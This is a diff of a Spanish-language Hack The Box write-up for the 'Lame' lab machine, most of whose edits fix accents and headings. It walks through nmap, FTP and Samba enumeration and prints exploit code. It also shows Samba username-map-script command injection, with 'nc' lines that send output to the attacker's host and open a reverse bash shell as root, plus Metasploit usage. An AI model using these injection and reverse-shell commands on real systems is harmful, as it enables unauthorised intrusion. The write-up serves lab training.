@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Lame - Hack The Box
-excerpt: "La maquina lame es una de las primeras maquinas que hice, justo despues del starting point, obviamente necesite mucha ayuda porque habia cosas que aun no comprendia del todo. Es una maquina super facil, ya que lo unico que haremos sera utilizar el servicio Samba para poder obtener a tener acceso a la maquina."
+excerpt: "La máquina lame es una de las primeras maquinas que hice, justo después del **Starting Point**, obviamente necesité mucha ayuda porque había cosas que aún no comprendía del todo. Es una maquina super fácil, ya que lo único que haremos será utilizar el servicio Samba para poder obtener acceso a la máquina."
 date: 2023-01-11
 classes: wide
 header:
@@ -10,11 +10,11 @@ header:
   icon: /assets/images/hackthebox.webp
 categories:
   - HackTheBox
+  - Easy Machine
 tags:
   - Linux
   - Samba
   - FTP
-  - Exploit
   - Username Map Script
   - OSCP Style
   - Metasploit
@@ -22,10 +22,10 @@ tags:
 
 ![](/assets/images/htb-writeup-lame/lame_logo.png)
 
-La maquina lame es una de las primeras maquinas que hice, justo despues del starting point, obviamente necesite mucha ayuda porque habia cosas que aun no comprendia del todo. Es una maquina super facil, ya que lo unico que haremos sera utilizar el servicio Samba para poder obtener acceso a la maquina.
+La máquina lame es una de las primeras maquinas que hice, justo después del **Starting Point**, obviamente necesité mucha ayuda porque había cosas que aún no comprendía del todo. Es una maquina super fácil, ya que lo único que haremos será utilizar el servicio Samba para poder obtener acceso a la máquina.
 
 ## Traza ICMP
-Para comenzar, debemos saber si la maquina esta conectada o no. Para esto lanzamos una traza ICMP que no es más que enviar paquetes de datos con la finalidad de que lleguen a un destino, si se pierden es que la maquina no esta conectada, pero si llegan, entonces podemos empezar.
+Para comenzar, debemos saber si la maquina está conectada o no. Para esto lanzamos una traza ICMP que no es más que enviar paquetes de datos con la finalidad de que lleguen a un destino, si se pierden es que la maquina no está conectada, pero si llegan, entonces podemos empezar.
 ```
 ping -c 4 10.10.10.3                  
 PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
@@ -40,8 +40,8 @@ rtt min/avg/max/mdev = 128.329/129.436/131.846/1.404 ms
 ```
 Lanzamos 4 paquetes, entonces podemos iniciar la penetración.
 
-## Escaneo de puertos
-Vamos a realizar un escaneo de los puertos que tenga abiertos la maquina, este escaneo lo guardaremos en un fichero grepeable para poder analizarlo mejor. Una vez obtenidos los puertos haremos un escaneo de servicios.
+## Escaneo de Puertos
+Vamos a realizar un escaneo de los puertos que tenga abiertos la máquina, este escaneo lo guardaremos en un fichero grepeable para poder analizarlo mejor. Una vez obtenidos los puertos haremos un escaneo de servicios.
 
 ```
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts
@@ -77,9 +77,9 @@ Nmap done: 1 IP address (1 host up) scanned in 31.56 seconds
 
 * --open: Para indicar que aplique el escaneo en los puertos abiertos.
 
-* -sS: Para indicar un TCP SYN port Scan para que nos agilice el escaneo.
+* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
 
-* --min-rate: Para indicar una cantidad de envio de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
+* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
 
 * -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
 
@@ -90,7 +90,7 @@ Nmap done: 1 IP address (1 host up) scanned in 31.56 seconds
 * -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
 ## Escaneo de servicios
-Analizando el escaneo de servicios, observamos que hay 3 servicios que nos interesan. El primero es el servicio FTP ya que podemos logearnos como anonymous, el servicio ssh aunque de momento no tenemos ningun usuario ni credencial y el servicio Samba aunque lo vemos en 2 puertos, el que nos interesa más sera el puerto 445.
+Analizando el escaneo de servicios, observamos que hay 3 servicios que nos interesan. El primero es el servicio FTP ya que podemos loguearnos como anonymous, el servicio ssh aunque de momento no tenemos ningún usuario ni credencial y el servicio Samba aunque lo vemos en 2 puertos, el que nos interesa más será el puerto 445.
 ```
 nmap -sC -sV -p21,22,139,445,3632
 Nmap 7.93 scan initiated Wed Jan 11 14:10:38 2023 as: nmap -sC -sV -p21,22,139,445,3632 -oN targeted 10.10.10.3
@@ -140,15 +140,12 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done at Wed Jan 11 14:11:32 2023 -- 1 IP address (1 host up) scanned in 54.32 seconds
 ```
-* -sC: Para indicar un lanzamiento de scripts basicos de reconocimiento.
-
-* -sV: Para identificar los servicios/version que estan activos en los puertos que se analicen.
-
-* -p: Para indicar puertos especificos.
-
+* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
+* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
+* -p: Para indicar puertos específicos.
 * -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-## Analizando el servicio FTP
+## Analizando el Servicio FTP
 Entraremos a este servicio como usuario anonymous, para ver que podemos encontrar que nos pueda ser util.
 ```
 ftp 10.10.10.3 
@@ -173,17 +170,17 @@ drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
 ftp> exit
 221 Goodbye
 ```
-Nada, no hay nada que podamos usar. Asi que vamos a intentar probar si podemos subir archivos:
+Nada, no hay nada que podamos usar. Así que vamos a intentar probar si podemos subir archivos:
 ```
 ftp> put /etc/passwd
 local: /etc/passwd remote: /etc/passwd
 229 Entering Extended Passive Mode (|||15322|).
 553 Could not create file.
 ```
-No se puede, por lo que deducimos que no tenemos permisos de escritura. Aunque quiza hay un exploit que podamos usar aqui.
+No se puede, por lo que deducimos que no tenemos permisos de escritura. Aunque quizá hay un exploit que podamos usar aquí.
 
-## Buscando un exploit para el servicio FTP
-Recordemos que tenemos la version del servicio FTP de la maquina victima, por lo que podemos investigar si hay un exploit que nos sirva para vulnerar dicha maquina.
+## Buscando un Exploit para el Servicio FTP
+Recordemos que tenemos la versión del servicio FTP de la máquina víctima, por lo que podemos investigar si hay un exploit que nos sirva para vulnerar dicha máquina.
 
 ```
 searchsploit vsftpd 2.3.4  
@@ -222,15 +219,14 @@ tn2.interact()
 
 ```
 * Searchsploit -x: Para ver el exploit.
-
 * Searchsploit -m: Para copiar el exploit.
 
-Lo que hace este exploit es tratar de conectarnos al servicio FTP a traves del puerto 6200 (o eso creo xd), pero no creo que funcione porque dicho puerto no esta abierto, asi que no perdamos tiempo y mejor analicemos el servicio Samba.
+Lo que hace este exploit es tratar de conectarnos al servicio FTP a través del puerto 6200 (o eso entiendo), pero no creo que funcione porque dicho puerto no está abierto, así que no perdamos tiempo y mejor analicemos el servicio Samba.
 
-## Analizando el servicio Samba
-Ahora nos logeamos en el Samba para ver que hay dentro, lo haremos de una forma sin que tengamos que meter un usuario.
+## Analizando el Servicio Samba
+Ahora nos logueamos en el Samba para ver que hay dentro, lo haremos de una forma sin que tengamos que meter un usuario.
 
-Primero vamos a tratar de mostrar los recursos compartidos que esten a nivel de red, para ver si hay algo util.
+Primero vamos a tratar de mostrar los recursos compartidos que estén a nivel de red, para ver si hay algo útil.
 ```
 smbclient -L 10.10.10.3 -N --option 'client min protocol = NT1'
 Anonymous login successful
@@ -256,7 +252,7 @@ Anonymous login successful
 
 * -N: Sirve para que no nos pida usuario y contraseña para logearnos, osea un Null Session.
 
-Observamos ahi algo curioso en el recurso tmp, puede que ahi tengamos algo que nos ayude asi que vamos a logearnos directamente ahi:
+Observamos ahí algo curioso en el recurso TMP, puede que ahí tengamos algo que nos ayude así que vamos a logearnos directamente ahí:
 ```
 smbclient //10.10.10.3/tmp -N                                  
 Anonymous login successful
@@ -274,10 +270,10 @@ smb: \> dir
                 7282168 blocks of size 1024. 5386560 blocks available
 smb: \> 
 ```
-Pues no veo nada util, bueno que yo sepa ahi no nos sirve algo, asi que mejor vamos a buscar un exploit que no ayude aqui.
+Pues no veo nada útil, bueno que yo sepa ahí no nos sirve algo, así que mejor vamos a buscar un exploit que no ayude aquí.
 
-## Buscando, analizando y probando un exploit para Samba
-Como mencione anteriormente como no encontramos mucho aqui lo que podemos hacer es buscar un exploit que nos ayude.
+## Buscando, Analizando y Probando un Exploit para Samba
+Como mencione anteriormente como no encontramos mucho aquí lo que podemos hacer es buscar un exploit que nos ayude.
 ```
 searchsploit Samba 3.0.20      
 ---------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -291,7 +287,7 @@ Samba < 3.6.2 (x86) - Denial of Service (PoC)                                   
 Shellcodes: No Results
 Papers: No Results
 ```
-Vamos a analizar el exploit que esta hecho en ruby, osea el "Username map script". El exploit es usado en Metasploit de forma automatizada pero analicemos cual es el exploit que usa. Recuerda usar el comando `searchsploit -x ` para analizar el exploit.
+Vamos a analizar el exploit que esta hecho en ruby, ósea el **Username Map Script**. El exploit es usado en **Metasploit** de forma automatizada pero analicemos cual es el exploit que usa. Recuerda usar el comando **searchsploit -x** para analizar el exploit.
 
 ```
 def exploit
@@ -310,9 +306,9 @@ def exploit
                 handler
         end
 ```
-Quiza podamos usar esta parte **username = "/=`nohup " + payload.encoded + "`"**  para poder ganar acceso. Para intentar logearnos usaremos el comando logon que nos pide un usuario y contraseña para ver si podemos inyectar codigo.
+Quizá podamos usar esta parte **username = "/=`nohup " + payload.encoded + "`"**  para poder ganar acceso. Para intentar loguearnos usaremos el comando logon que nos pide un usuario y contraseña para ver si podemos inyectar código.
 
-Levantamos un tcpdump para capturas los paquetes lanzados por traza ICMP:
+Levantamos un tcpdump para capturar los paquetes lanzados por traza ICMP:
 ```
 tcpdump -i tun0 icmp -n
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
@@ -346,8 +342,7 @@ Esto quiere decir que si podemos inyectar comandos, hagamos otra prueba. Esta ve
 nc -lvnp 443           
 listening on [any] 443 ...
 ```
-
-Inyectando comando, desde la sesion de Samba:
+Inyectando comando, desde la sesión de Samba:
 ```
 smb: \> logon "/=`nohup whoami | nc 10.10.14.8 443`"
 Password: 
@@ -361,8 +356,8 @@ connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 32800
 root
 ```
 
-## Accediendo a la maquina
-Como ya vimos en las pruebas anteriores, podemos tratar de conectar una terminal bash a la maquina victima, asi que alzaremos una netcat y veremos si podemos activarla.
+## Accediendo a la Máquina
+Como ya vimos en las pruebas anteriores, podemos tratar de conectar una terminal bash a la máquina víctima, así que alzaremos una netcat y veremos si podemos activarla.
 ```
 logon "/=`nohup nc -e /bin/bash 10.10.14.8 443`"
 Password:
@@ -411,10 +406,10 @@ root@lame:/# find \-name root.txt
 ./root/root.txt
 root@lame:/# cat ./root/root.txt
 ```
-Y listo ya quedo esta maquina al estilo OSCP.
+Y listo ya quedo esta máquina al estilo OSCP.
 
 # Metasploit
-Con esta madre es super sencillo y ps casi no aprende ni papa pero aun asi por si lo quieren probar, asi se usa:
+Con esta madre es super sencillo y ps casi no aprendes ni papa pero aun así por si lo quieren probar, así se usa:
 
 ## Activando Metaspploit
 Para comenzar a usar Metasploit primero debemos iniciar la base de datos de este:
@@ -444,7 +439,7 @@ msfconsole
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 ```
 ## Usando Metasploit
-Una vez activado tan simple como lo habiamos hecho antes, buscamos el servicio para ver si hay un exploit y lo usamos:
+Una vez activado tan simple como lo habíamos hecho antes, buscamos el servicio para ver si hay un exploit y lo usamos:
 ```
 msf6 > search Samba 3.0.20
 
@@ -458,13 +453,13 @@ Matching Modules
 
 Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
 ```
-Para usarlo solamente escribimos el nombre y el comando use:
+Para usarlo solamente escribimos el nombre y el comando **use**:
 ```
 msf6 > use exploit/multi/samba/usermap_script
 [*] No payload configured, defaulting to cmd/unix/reverse_netcat
 msf6 exploit(multi/samba/usermap_script) >
 ```
-Para ver como usarlo, usamos el comando show options:
+Para ver cómo usarlo, usamos el comando show options:
 
 ```
 msf6 exploit(multi/samba/usermap_script) > show options
@@ -495,7 +490,7 @@ Exploit target:
 
 View the full module info with the info, or info -d command.
 ```
-Solamente cambiamos lo que nos pide, que seria el RHOST, LHOST y el LPORT:
+Solamente cambiamos lo que nos pide, que sería el RHOST, LHOST y el LPORT:
 ```
 msf6 exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3
 RHOST => 10.10.10.3
